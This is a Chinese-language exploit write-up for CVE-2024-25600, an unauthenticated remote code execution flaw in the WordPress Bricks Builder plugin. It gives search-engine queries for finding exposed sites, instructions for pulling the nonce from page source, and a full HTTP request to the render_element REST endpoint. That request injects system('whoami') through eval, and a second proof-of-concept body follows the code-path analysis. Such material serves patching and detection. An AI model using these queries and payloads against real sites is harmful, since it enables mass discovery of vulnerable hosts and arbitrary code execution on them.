# CVE-2024-25600

> **Created by：** A-little-dragon
>
> **Team：** TracelessSec
>
> **漏洞描述：** WordPress Bricks Builder 未授权远程代码执行漏洞



## **0x00 空间搜索引擎相关查询语法**

```python
[FOFA]
body="/wp-content/thems/bricks/"

[鹰图]
web.body="/wp-content/thems/bricks/"
```

## 0x01 **漏洞原理**

该漏洞源于通过`prepare_query_vars_from_settings()`中的 eval 函数执行用户控制的输入，由于权限检查不当，未经身份验证的威胁者可利用该漏洞在受影响的WordPress 网站上执行任意PHP代码。

## 0x02 影响范围

WordPress Brick Builder <=1.9.6

## **0x03 漏洞利用**

查看网页源代码，搜索nonce关键词，对应的值就是我们需要的值

![Untitled](image/Untitled%202.png)

```python
POST /wp-json/bricks/v1/render_element HTTP/2
Host: # URL
Cookie: # Cookie
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "(Not(A:Brand";v="99", "Chromium";v="115", "Microsoft Edge";v="113"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5814.204 Safari/537.36 Edg/113.0.1544.41
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Content-Type: application/x-www-form-urlencoded
Content-Length: 252

{
	"postId":"1",
	"nonce":"xxxxxx",
	"element":{
		"name":"container",
		"settings":{
			"hasLoop":"true",
			"query":{
				"userQueryEditor": true,
				"queryEditor":"system('whoami');throw new Exception();",
				"objectType":"post"
			}
		}
	}
}
```

## **0x04 利用链分析**

`includes/query.php`的`prepare_query_vars_from_settings`函数是漏洞的触发点

![Untitled](image/Untitled%203.png)

接着向下看

![Untitled](image/Untitled%204.png)

继续跟踪，发现该函数被`query.php`文件的`__construct`函数调用

![Untitled](image/Untitled%205.png)

发现如果`$query_instance`为false就会执行`self::prepare_query_vars_from_settings( $this->settings );`该方法。

继续追踪，发现`Query`类被`ajax.php` 

![Untitled](image/Untitled%206.png)

![Untitled](image/Untitled%207.png)

**`stripslashes_deep()`**：这是一个 WordPress 函数，用于移除字符串或数组中的反斜杠。它会递归地移除字符串中的反斜杠，以及数组中所有元素（包括嵌套数组）中的反斜杠。

继续分析

![Untitled](image/Untitled%208.png)

进入该函数，继续分析

![Untitled](image/Untitled%209.png)

`Capabilities::current_user_can_use_builder( $post_id )`，通过传入postId来判断当前用户是否有权限使用页面构建器（builder）。

下面，我们继续分析`render_element()`函数

![Untitled](image/Untitled%2010.png)

发现会从elements变量中获取name的值，并且会通过该name 获取到一个类，并判断这个类是否存在，如果不存在会抛出doesn't exist内容，从而导致RCE失败。

跟踪`Elements::$elements`，

![Untitled](image/Untitled%2011.png)

这个变量中会定义很多name的值

![Untitled](image/Untitled%2012.png)

![Untitled](image/Untitled%2013.png)

继续查找`render_element()`被谁调用了，发现位于`includes/api.php`文件中`render_element()`函数调用了它

![Untitled](image/Untitled%2014.png)

继续分析，发现`rest_api_init_custom_endpoints()`函数，在 WordPress 中注册了很多 REST API 路由

![Untitled](image/Untitled%2015.png)

而该`rest_api_init_custom_endpoints()`函数实际上是Api这个类在初始化后就被执行了

![Untitled](image/Untitled%2016.png)

继续分析

- **`self::API_NAMESPACE`**：这是一个常量或者类属性，表示 REST API 的命名空间。这个命名空间用于标识此路由所属的 API 部分。
- **`'render_element'`**：这是路由的端点 (endpoint)，表示 API 中的具体资源或功能。
- **`self::API_NAMESPACE，render_element`：**代表该路由地址`bricks/v1/bricks/render_element`，
- `methods`： 代表参数指定了该路由支持的 HTTP 请求方法
- **`callback`**：这个参数是一个回调函数或方法，当路由匹配时会被调用。在这里，设置为 **`[ $this, 'render_element' ]`**，表示当路由匹配时会调用当前类 (**`$this`**) 中的 **`render_element`** 方法。
- **`permission_callback`**：这个参数指定了权限检查回调函数，用于检查用户是否有权限执行该请求。在这里，设置为 **`[ $this, 'render_element_permissions_check' ]`**，表示在调用**`render_element`** 方法之前会先调用当前类 (**`$this`**) 中的 **`render_element_permissions_check`** 方法进行权限检查。

我们继续分析`render_element_permissions_check()`函数

![Untitled](image/Untitled%2017.png)

可以看出仅仅只检查了`nonce`随机数的值，而没有检查用户的权限。nonce就是我们用户传进去的`nonce`的值，也就是说是可控的

因此，综上分析之后，我们就可以写出以下poc

```python
{
"postId":"1",
"nonce":"3d6020fb9a",
"element":{
    "name":"container",
    "settings":{
        "hasLoop":"true",
        "query":{
            "useQueryEditor":true,
            "queryEditor":"system('whoami');throw new Exception();", 
            "objectType":"post"
        }
    }
}
}

```

**`PS:`** throw new Exception()是为了抛错回显

**附利用链图**

![Untitled](image/Untitled%2018.png)

## 0x05 总结

整个漏洞的产生原因是因为在定义API端点接口的时候，只对可见的随机数nonce进行了验证而并没有进行权限检查，导致能够传入数据。从而控制动态渲染时$php_query_raw这个变量，最终传入到eval中，导致了代码的执行。